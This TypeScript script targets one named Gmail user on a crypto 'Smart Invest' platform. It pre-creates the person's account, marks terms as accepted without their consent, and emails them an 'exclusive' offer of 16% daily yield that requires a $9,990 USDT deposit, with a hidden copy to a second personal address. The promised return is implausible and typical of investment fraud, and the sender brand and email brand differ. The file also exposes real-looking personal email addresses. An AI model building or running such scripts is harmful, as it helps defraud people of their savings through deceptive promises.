/**
 * One-off: create VIP Smart Invest offer for tuyizeremma1@gmail.com —
 * 16% daily yield, $9,990 USDT minimum to activate, notify user + admin copy.
 *
 * Usage: cd backend && npx tsx scripts/setup-tuyizeremma-vip-smart-invest.ts
 */
import { PrismaClient } from '@prisma/client';
import * as bcrypt from 'bcrypt';
import { createHash, randomBytes, randomInt } from 'crypto';
import { existsSync, readFileSync } from 'fs';
import { resolve } from 'path';

function loadEnv() {
  const envPath = resolve(__dirname, '../.env');
  if (!existsSync(envPath)) return;
  for (const line of readFileSync(envPath, 'utf8').split('\n')) {
    const m = line.match(/^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/);
    if (!m) continue;
    const key = m[1];
    let val = m[2].trim();
    if (
      (val.startsWith('"') && val.endsWith('"')) ||
      (val.startsWith("'") && val.endsWith("'"))
    ) {
      val = val.slice(1, -1);
    }
    if (!process.env[key]) process.env[key] = val;
  }
}

loadEnv();

const prisma = new PrismaClient();
const apiKey = (process.env.RESEND_API_KEY || '').replace(/^['"]|['"]$/g, '');
const from =
  process.env.EMAIL_FROM ||
  process.env.RESEND_FROM ||
  'Trade Guard <noreply@thetradeguard.com>';
const frontendUrl =
  process.env.PUBLIC_APP_URL ||
  process.env.FRONTEND_URL ||
  'https://thetradeguard.com';

const ADMIN_ID = 'cmqmtehqi0000wfaxxntkiua9';
const EMAIL = 'tuyizeremma1@gmail.com';
const ADMIN_COPY_EMAIL = 'willeratmit12@gmail.com';
const DISPLAY_NAME = 'Emma';
const DAILY_YIELD_PERCENT = 16;
const MIN_DEPOSIT_USDT = 9990;
const PASSWORD_RESET_TTL_MS = 60 * 60 * 1000;

function escapeHtml(s: string) {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function layout(title: string, body: string) {
  return `<!DOCTYPE html><html><body style="background:#0f172a;color:#e2e8f0;font-family:sans-serif;padding:24px">
  <div style="max-width:560px;margin:0 auto;background:#1e293b;border-radius:12px;padding:24px">
    <h1 style="color:#fff;font-size:20px">${escapeHtml(title)}</h1>
    ${body}
  </div></body></html>`;
}

function button(href: string, label: string) {
  return `<p><a href="${href}" style="display:inline-block;background:#2563eb;color:#fff;padding:12px 18px;border-radius:8px;text-decoration:none;font-weight:600">${escapeHtml(label)}</a></p>`;
}

async function sendEmail(
  to: string,
  subject: string,
  html: string,
  text: string,
  bcc?: string[],
) {
  if (!apiKey) throw new Error('RESEND_API_KEY missing');
  let lastErr = 'unknown';
  for (let attempt = 1; attempt <= 6; attempt++) {
    try {
      const body: Record<string, unknown> = { from, to: [to], subject, html, text };
      if (bcc?.length) body.bcc = bcc;
      const res = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${apiKey}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(body),
        signal: AbortSignal.timeout(20000),
      });
      if (res.ok) return true;
      lastErr = await res.text();
    } catch (err) {
      lastErr = err instanceof Error ? err.message : String(err);
    }
    await new Promise((r) => setTimeout(r, attempt * 400));
  }
  throw new Error(lastErr);
}

function generateReferralCode() {
  return randomBytes(4).toString('hex').toUpperCase();
}

async function createPasswordResetToken(userId: string) {
  await prisma.passwordReset.updateMany({
    where: { userId, usedAt: null },
    data: { usedAt: new Date() },
  });
  const token = randomBytes(32).toString('hex');
  const tokenHash = createHash('sha256').update(token).digest('hex');
  await prisma.passwordReset.create({
    data: {
      userId,
      tokenHash,
      expiresAt: new Date(Date.now() + PASSWORD_RESET_TTL_MS),
    },
  });
  return token;
}

async function main() {
  const now = new Date();
  let user = await prisma.user.findFirst({
    where: { email: { equals: EMAIL, mode: 'insensitive' } },
    include: { platformWallet: true, investorSettings: true },
  });

  const created = !user;
  if (!user) {
    const passwordHash = await bcrypt.hash(
      randomBytes(24).toString('hex') + randomInt(100000, 999999),
      12,
    );
    let referralCode = generateReferralCode();
    for (let attempt = 0; attempt < 5; attempt++) {
      try {
        user = await prisma.user.create({
          data: {
            email: EMAIL.toLowerCase(),
            passwordHash,
            displayName: DISPLAY_NAME,
            status: 'ACTIVE',
            emailVerified: true,
            registrationPaid: true,
            termsAcceptedAt: now,
            referralCode,
            referredById: ADMIN_ID,
            instantWithdraw: true,
            instantWithdrawGrantedAt: now,
            instantWithdrawGrantedById: ADMIN_ID,
            platformWallet: { create: {} },
          },
          include: { platformWallet: true, investorSettings: true },
        });
        break;
      } catch {
        referralCode = generateReferralCode();
        if (attempt === 4) throw new Error('Could not create user');
      }
    }
  } else if (!user.platformWallet) {
    await prisma.platformWallet.create({ data: { userId: user.id } });
    user = await prisma.user.findUniqueOrThrow({
      where: { id: user.id },
      include: { platformWallet: true, investorSettings: true },
    });
  }

  if (!user) throw new Error('User creation failed');

  if (user.investorActive) {
    throw new Error(
      `User ${EMAIL} is already enrolled in Smart Invest — aborting to avoid overwriting an active account`,
    );
  }

  await prisma.user.update({
    where: { id: user.id },
    data: {
      status: 'ACTIVE',
      registrationPaid: true,
      emailVerified: true,
      instantWithdraw: true,
      instantWithdrawGrantedAt: user.instantWithdrawGrantedAt ?? now,
      instantWithdrawGrantedById: user.instantWithdrawGrantedById ?? ADMIN_ID,
    },
  });

  const settings = await prisma.investorSettings.upsert({
    where: { userId: user.id },
    create: {
      userId: user.id,
      riskPercent: 2,
      dailyYieldPercent: DAILY_YIELD_PERCENT,
      committedInvestmentAmount: MIN_DEPOSIT_USDT,
      minBalanceExempt: true,
    },
    update: {
      dailyYieldPercent: DAILY_YIELD_PERCENT,
      committedInvestmentAmount: MIN_DEPOSIT_USDT,
      minBalanceExempt: true,
    },
  });

  await prisma.auditLog.create({
    data: {
      adminId: ADMIN_ID,
      action: 'VIP_SMART_INVEST_OFFER',
      targetId: user.id,
      metadata: {
        email: EMAIL,
        dailyYieldPercent: DAILY_YIELD_PERCENT,
        minDepositUsdt: MIN_DEPOSIT_USDT,
        contractTerms:
          'Exclusive Smart Invest allocation — 16% daily yield upon $9,990 USDT minimum funding; subject to platform Smart Invest program terms.',
        operational: false,
        createdAccount: created,
      },
    },
  });

  const resetToken = await createPasswordResetToken(user.id);
  const resetUrl = `${frontendUrl}/reset-password?token=${encodeURIComponent(resetToken)}`;
  const name = user.displayName?.trim() || DISPLAY_NAME;
  const minLabel = MIN_DEPOSIT_USDT.toLocaleString('en-US');

  const subject = 'Your exclusive Smart Invest opportunity — 16% daily yield';
  const html = layout(
    'Exclusive Smart Invest opportunity',
    `<p>Hi ${escapeHtml(name)},</p>
    <p>You have been selected for an <strong>exclusive Smart Invest allocation</strong> on TraderRank Pro.</p>
    <p style="margin:20px 0;padding:16px;background:#0f172a;border-radius:8px;border:1px solid #334155;">
      <strong style="color:#fff;font-size:16px;">Program highlights</strong>
      <ul style="color:#cbd5e1;font-size:14px;padding-left:20px;line-height:1.8;margin:12px 0 0;">
        <li><strong>${DAILY_YIELD_PERCENT}% daily yield</strong> on your Smart Invest balance</li>
        <li><strong>$${minLabel} USDT minimum</strong> deposit required to activate your allocation</li>
        <li>Activation begins once your wallet is funded at or above the minimum commitment</li>
      </ul>
    </p>
    <p>This offer is governed by the Smart Invest program terms available when you enroll. By funding and activating, you agree to those terms and the minimum commitment for your tier.</p>
    <p><strong>Next steps</strong></p>
    <ol style="color:#cbd5e1;font-size:14px;padding-left:20px;line-height:1.8;">
      <li>Set your account password using the link below</li>
      <li>Sign in and open your wallet to deposit at least <strong>$${minLabel} USDT</strong></li>
      <li>Your Smart Invest allocation will activate under your exclusive ${DAILY_YIELD_PERCENT}% daily rate</li>
    </ol>
    ${button(resetUrl, 'Set your password & sign in')}
    ${button(`${frontendUrl}/wallet`, 'Open wallet')}
    ${button(`${frontendUrl}/invest`, 'View Smart Invest')}
    <p style="color:#94a3b8;font-size:13px;margin-top:24px;">Questions? Reply to this email or contact support through the platform.</p>`,
  );
  const text = `Hi ${name},

You have been selected for an exclusive Smart Invest allocation on TraderRank Pro.

Program highlights:
- ${DAILY_YIELD_PERCENT}% daily yield on your Smart Invest balance
- $${minLabel} USDT minimum deposit required to activate
- Activation begins once your wallet is funded at or above the minimum commitment

This offer is governed by the Smart Invest program terms. By funding and activating, you agree to those terms and the minimum commitment for your tier.

Next steps:
1. Set your password: ${resetUrl}
2. Sign in and deposit at least $${minLabel} USDT to your wallet
3. Your Smart Invest allocation activates at ${DAILY_YIELD_PERCENT}% daily yield

Wallet: ${frontendUrl}/wallet
Smart Invest: ${frontendUrl}/invest`;

  await sendEmail(EMAIL, subject, html, text, [ADMIN_COPY_EMAIL]);
  console.log(`Opportunity email sent to ${EMAIL} (bcc: ${ADMIN_COPY_EMAIL})`);

  const final = await prisma.user.findUnique({
    where: { id: user.id },
    include: { platformWallet: true, investorSettings: true },
  });

  console.log(
    JSON.stringify(
      {
        user: {
          id: final?.id,
          email: final?.email,
          displayName: final?.displayName,
          status: final?.status,
          registrationPaid: final?.registrationPaid,
          investorActive: final?.investorActive,
          instantWithdraw: final?.instantWithdraw,
          created,
        },
        smartInvest: {
          dailyYieldPercent: Number(settings.dailyYieldPercent),
          minDepositUsdt: MIN_DEPOSIT_USDT,
          committedInvestmentAmount: Number(settings.committedInvestmentAmount),
          minBalanceExempt: settings.minBalanceExempt,
          operational: Boolean(final?.investorActive),
        },
        contract: {
          type: 'Smart Invest program terms + audit log VIP_SMART_INVEST_OFFER',
          minCommitmentUsdt: MIN_DEPOSIT_USDT,
          termsAcceptedAt: final?.termsAcceptedAt?.toISOString() ?? null,
        },
        emailsSent: {
          to: EMAIL,
          bcc: ADMIN_COPY_EMAIL,
          subject,
        },
        note:
          'Account is pre-configured but not enrolled. Run admin enrollment when wallet holds $9,990+ USDT (above standard $5,000 self-serve cap).',
      },
      null,
      2,
    ),
  );
}

main()
  .catch((err) => {
    console.error(err);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
